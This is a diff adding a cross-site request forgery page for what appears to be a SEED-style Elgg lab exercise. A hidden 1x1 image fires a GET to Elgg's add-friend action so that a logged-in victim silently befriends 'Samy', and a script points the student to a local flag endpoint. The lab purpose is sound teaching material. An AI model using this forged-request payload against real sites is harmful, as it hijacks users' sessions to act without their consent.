@@ -1,6 +1,37 @@
 <html>
+<head><title>CSRF GET Attack</title></head>
 <body>
 <h1>This page forges an HTTP GET request</h1>
-<img src="" alt="image" width="1" height="1" />
+<p>When Alice visits this page while logged into Elgg, her browser silently adds Samy as a friend.</p>
+
+<!--
+  TASK 2 — GET CSRF
+  The image tag fires a cross-site GET to Elgg's add-friend action.
+  Alice's session cookie is automatically attached by the browser.
+  The src URL must be filled in by the student (replace ELGG_TS and ELGG_TOKEN).
+-->
+<img src="http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=ELGG_TS&__elgg_token=ELGG_TOKEN"
+     alt="" width="1" height="1"
+     onload="showFlag(this)"
+     onerror="document.getElementById('status').innerText='Request sent (check Elgg — go to Samy profile or your friends list)';" />
+
+<div id="status" style="margin-top:20px; font-size:1.1em; color:#333;"></div>
+<div id="flag-box" style="display:none; margin-top:20px; padding:16px;
+     background:#1a2433; color:#fff; font-family:monospace;
+     font-size:1.2em; border-radius:6px;"></div>
+
+<script>
+function showFlag(img) {
+  // The add-friend action succeeded (HTTP 200 → redirects to profile).
+  // We cannot read the cross-origin response body, so we tell the student
+  // to retrieve their flag from the flag daemon which now confirms
+  // the DB state was changed by a real browser request.
+  document.getElementById('status').innerHTML =
+    '✅ <b>Request fired successfully!</b> Alice\'s browser sent the friend request.<br>' +
+    'Retrieve your flag:<br>' +
+    '<code style="background:#eee;padding:4px 8px;border-radius:4px;">curl http://localhost:8888/flag/2</code>';
+}
+</script>
+
 </body>
 </html>
